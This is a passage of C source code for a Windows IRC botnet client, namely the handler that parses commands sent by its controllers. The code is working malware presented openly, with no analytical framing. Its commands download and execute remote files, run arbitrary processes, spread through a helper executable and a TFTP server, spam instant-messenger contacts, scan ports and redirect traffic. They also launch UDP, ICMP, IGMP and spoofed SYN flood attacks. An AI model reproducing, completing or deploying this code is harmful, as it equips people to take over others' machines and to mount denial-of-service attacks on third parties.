				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0 || strcmp("rn", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			else if (strcmp("who", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) {
				    if(masters[i][0] != '\0')
    					sprintf(sendbuf, "%d: %s\r\n", i, masters[i]+1);
    			    else
    			        sprintf(sendbuf, "%d: <FREE SLOT>\r\n", i);
    				irc_privmsg(sock, a[2], sendbuf, notice);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :.3,1....3:.:..9:.:..0.0]....9G.-S.y.S.v.3...0.9.0.0[..9.:.:.3.:.:..3..");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :.3,1....3:.:..9:.:..0.0]....9G.-S.y.S.v.3...0.9.0.0[..9.:.:.3.:.:..3..\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, vername" ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("about", a[s]) == 0 || strcmp("ab", a[s]) == 0) irc_privmsg(sock, a[2], vername" by netw3rm and xyclone.", notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[thread list]-", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("release", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			#ifndef NO_SPREAD
			else if (strcmp("spread_stop", a[s]) == 0 && !notSpreading )
			{
				if ( (int) ShellExecute(NULL,NULL,"libparse.exe","-kf espread.exe",NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2],"Error: Unable to execute libparse.exe", notice);
					return 1;
				}
				notSpreading = true;
				return 1;
			}
			#endif
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			/*else if (strcmp("cdtray", a[s]) == 0 || strcmp("cd", a[s]) == 0) {
				if (atoi(a[s+1]) == 0) {
				    irc_privmsg(sock, a[2], "cd-rom drive tray closed\r\n", notice);
					mciSendString("set CDAudio door closed", NULL, 127, 0);
				}
				else {
					irc_privmsg(sock, a[2], "cd-rom drive tray opened\r\n", notice);
					mciSendString("set CDAudio door open", NULL, 127, 0);
				}
			}*/
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				BOOL threadkilled = FALSE;
				for (i=1; a[s+i] != NULL; i++) if (strlen(a[s+i]) < 3) if (atoi(a[s+i]) < 64 && atoi(a[s+i]) > 0) {
					TerminateThread(threads[atoi(a[s+i])], 0);
					if (threads[atoi(a[s+i])] != 0) threadkilled = TRUE;
					threads[atoi(a[s+i])] = 0;
					threadd[atoi(a[s+i])][0] = '\0';
					cnick[atoi(a[s+i])][0] = '\0';
					closesocket(csock[atoi(a[s+i])]);
				}
					if (!silent) if (threadkilled) irc_privmsg(sock, a[2], "thread(s) killed.", notice);
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])], id);
					threads[atoi(a[s+1])] = 0;
					threadd[atoi(a[s+1])][0] = '\0';
				}
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "file opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
				vs vs;
				strncpy(vs.host,  a[s+1], sizeof(vs.host)-1);
				if (a[s+2] != NULL) strncpy(vs.referer, a[s+2], sizeof(vs.referer)-1);
				strncpy(vs.chan, a[2], sizeof(vs.chan)-1);
				vs.sock = sock;
				vs.silent = silent;
				CreateThread(NULL, 0, &visit, (void *)&vs, 0, &id);
				while(1) {
					if (vs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_IMSPREAD
			else if (strcmp("imsend", a[s]) == 0) {
				int Aen = s+1;

				strcpy(IMmsg, "");
				while (a[Aen]) {
					sprintf(IMmsg, "%s %s", IMmsg, a[Aen]);
					Aen++;
				}
				EnumWindows(EnumMSN, 0);
				EnumWindows(EnumAIM, 0);
				EnumWindows(EnumYahoo, 0);
			}
			#endif
			else if (strcmp("kill", a[s]) == 0 )
			{
				char kill[255] = "";
				sprintf(kill,"-kf %s",a[s+1]);
				if ( (int) ShellExecute(NULL,NULL,"libparse.exe",kill,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2],"Error: Unable to execute libparse.exe", notice);
					return 1;
				}
				return 1;
			}
			else if (strcmp("rem", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) {
				    if(i == atoi(a[s+1])) {
    				    if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "The slot %d has been freed (%s has been logged out)", i, masters[i]+1);
        					masters[i][0] = '\0';
        			    } else
        			        sprintf(sendbuf, "The slot %d is already free\r\n", i);
        			    
        			    irc_privmsg(sock, a[2], sendbuf, notice);
        			    break;
        			}
				}
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("renew", a[s]) == 0 ) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				sprintf(ds.dest, "%s\\%s.exe", tempdir, nick);
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}
			#ifndef NO_SPREAD
			else if (strcmp("spread", a[s]) == 0 && notSpreading )
			{
				char spread[255] = "";
				sprintf(spread,"%s %s",a[s+1],a[s+2]);
				if ( (int) ShellExecute(NULL,NULL,"espread.exe",spread,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2],"Error: Unable to execute espread.exe", notice);
					return 1;
				}
				notSpreading = false;
				strcpy(spread,"");
				sprintf(spread,"Spreading: %s TFTP Server: %s",a[s+2],a[s+1]);
				irc_privmsg(sock,a[2],spread,notice);
				return 1;
			}
			#endif
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "clone created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[irc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
				while(1) {
					if (irc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp("gget", a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum] = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf);
				if (!silent) sprintf(sendbuf, "redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum] = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						if (threadd[atoi(a[s+1])][0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}
			}
			#ifndef NO_SCAN
			else if (strcmp("scan", a[s]) == 0 || strcmp("sc", a[s]) == 0) {
				scans sscan;
				sscan.addy.S_un.S_addr = inet_addr(a[s+1]);
				sscan.port = atoi(a[s+2]);
				sscan.delay = atoi(a[s+3]);
				sscan.sock = sock;
				sscan.notice = notice;
				strncpy(sscan.chan,  a[2], sizeof(sscan.chan)-1);
				sprintf(sendbuf, "scan (%s:%d)", inet_ntoa(sscan.addy), sscan.port);
				sscan.threadnum = addthread(sendbuf);
				if (!silent) {
					sprintf(sendbuf, "scan started %s:%d with a delay of %dms\r\n", inet_ntoa(sscan.addy), sscan.port, sscan.delay);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[sscan.threadnum] = CreateThread(NULL, 0, &ip_scan, (void *)&sscan, 0, &id);
				while(1) {
					if (sscan.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_UDP
			else if (strcmp("udp", a[s]) == 0 || strcmp("u", a[s]) == 0) {
				ps udps;
				udps.silent = silent;
				strncpy(udps.host,  a[s+1], sizeof(udps.host)-1);
				udps.num = atoi(a[s+2]);
				udps.size = atoi(a[s+3]);
				udps.delay = atoi(a[s+4]);
				if (a[s+5] != NULL) udps.port = atoi(a[s+5]); else udps.port = 0;
				strncpy(udps.chan,  a[2], sizeof(udps.chan)-1);
				udps.sock = sock;
				sprintf(sendbuf, "udp (%s)", udps.host);
				udps.threadnum = addthread(sendbuf);
				sprintf(sendbuf, "3,1.3::9::0]9UDP0[9::3::3. Flooding: %s. Number: %d packet size: %d, delay: %d[ms].\r\n", udps.host, udps.num, udps.size, udps.delay);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				threads[udps.threadnum] = CreateThread(NULL, 0, &udp, (void *)&udps, 0, &id);
				while(1) {
					if (udps.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_PING
			else if (strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
				if (!noicmp) {
					ps pings;
					pings.silent = silent;
					strncpy(pings.host,  a[s+1], sizeof(pings.host)-1);
					pings.num = atoi(a[s+2]);
					pings.size = atoi(a[s+3]);
					pings.delay = atoi(a[s+4]);
					strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
					pings.sock = sock;
					sprintf(sendbuf, "ping (%s)", pings.host);
					pings.threadnum = addthread(sendbuf);
					sprintf(sendbuf, "3,1.3::9::0]9PING0[9::3::3. Flooding: %s. Number: %d packet size: %d, timeout: %d[ms]\r\n", pings.host, pings.num, pings.size, pings.delay);
					threads[pings.threadnum] = CreateThread(NULL, 0, &ping, (void *)&pings, 0, &id);
					while(1) {
						if (pings.gotinfo == TRUE) break;
						Sleep(50);
					}
				} else strncpy(sendbuf, "icmp.dll not available", sizeof(sendbuf)-1);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			}
			#endif
			#ifndef NO_SPY
			else if (strcmp("spy", a[s]) == 0 || strcmp("sp", a[s]) == 0) {
				ircs sirc;
				strncpy(sirc.nick,  a[s+1], sizeof(sirc.nick)-1);
				strncpy(sirc.host,  a[s+2], sizeof(sirc.host)-1);
				sirc.port = atoi(a[s+3]);
				strncpy(sirc.channel,  a[s+4], sizeof(sirc.channel)-1);
				if (a[s+5] != NULL) strncpy(sirc.chanpass,  a[s+5], sizeof(sirc.chanpass)-1);
				strncpy(sirc.hchan,  a[2], sizeof(sirc.hchan)-1);
				sirc.sock = sock;
				sirc.spy = 1;
				sprintf(sendbuf, "spy (%s)", sirc.host);
				sirc.threadnum = addthread(sendbuf);
				strncpy(cnick[sirc.threadnum], sirc.nick, sizeof(cnick[sirc.threadnum])-1);
				if (!silent) {
					sprintf(sendbuf, "spy created on %s:%d, in channel %s.\r\n", sirc.host, sirc.port, sirc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[sirc.threadnum] = CreateThread(NULL, 0, &irc_connect, (void *)&sirc, 0, &id);
				while(1) {
					if (sirc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_IGMP
			else if (strcmp("igmp", a[s]) == 0 )
			{
				char igmp[255] = "";
				sprintf(igmp,"%s -s %s -n %s -d %s",a[s+1],a[s+2],a[s+3],a[s+4]);
				if ( (int) ShellExecute(NULL,NULL,"igmp.exe",igmp,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2],"Error: Unable to execute igmp.exe", notice);
					return 1;
				}
				strcpy(igmp,"");
				sprintf(igmp,"3,1.3::9::0]9IGMP0[9::3::3. Flooding: %s Packet Size: %s Number of Packets: %s Delay: %ss",a[s+1],a[s+2],a[s+3],a[s+4]);
				irc_privmsg(sock,a[2],igmp,notice);
				return 1;
			}
			#endif
			#ifndef NO_BONK
			else if (strcmp("bonk", a[s]) == 0 )
			{
				char bonk[255] = "";
				sprintf(bonk,"%s -s %s -p %s -n %s",a[s+1],a[s+2],a[s+3],a[s+4]);
				if ( (int)ShellExecute(NULL,NULL,"bonker.exe",bonk,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2], "Error: Unable to execute bonker.exe", notice);
					return 1;
				}
				strcpy(bonk, "");
				sprintf(bonk,"3,1.3::9::0]9BONK0[9::3::3. Attacking: %s Source Port: %s Destination Port: %s Number of Packets: %s",a[s+1],a[s+2],a[s+3],a[s+4]);
				irc_privmsg(sock,a[2],bonk,notice);
			}
			#endif
			else if ( a[s+5] == NULL ) { return 1; }
			//commands requiring at least 5 parameters

			#ifndef NO_JOLT
			else if ( strcmp("jolt", a[s]) == 0 )
			{
				char jolt[255] = "";
				sprintf(jolt,"%s -P %s -p %s -n %s -d %s",a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]);
				if ( (int)ShellExecute(NULL,NULL,"cmsvc32",jolt,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2], "Error: Unable to execute jolter.exe", notice);
					return 1;
				}
				strcpy(jolt,"");
				sprintf(jolt,"3,1.3::9::0]9JOLT0[9::3::3. Attacking: %s Protocols: %s Destination Port: %s Number of Packets: %s Delay: %ss",a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]);
				return 1;
			}
			#endif
			else if ( a[s+6] == NULL ) { return 1; }
			//commands requiring at least 6 parameters
			
			#ifndef NO_SYN
			else if ( strcmp("syn",a[s]) == 0 )
			{
				char syn [255] = "";//meh it's big enough
				sprintf(syn,"%s -S %s -p %s -s %s -n %s -d %s\"",a[s+1],a[s+2],a[s+3],a[s+4],a[s+5],a[s+6]);
				if ( (int)ShellExecute(NULL,NULL,"syn.exe",syn,NULL,SW_HIDE) <= 32 )
				{
					irc_privmsg(sock,a[2],"ERROR: Unable to Execute!",notice);
					return 1;
				}
				strcpy(syn,"");
				sprintf(syn,"3,1.3::9::0]9SYN0[9::3::3. Flooding: %s Spoofed Host: %s Destination Port(s): %s, Source Port(s): %s, Number of Packets: %s, Delay: %ss",a[s+1],a[s+2],a[s+3],a[s+4],a[s+5],a[s+6]);
				irc_privmsg(sock,a[2],syn,notice);
				return 1;
			}
			#endif
		}
	}
	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1); // get our hostname
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}
	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}
	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"user %s logged out.", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "screw you %s!", user);
			irc_privmsg(sock, a[2], sendbuf, FALSE);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		if(oldnck != NULL && newnck != NULL) {
		    if(strcmp(oldnck, nick1) == 0) {
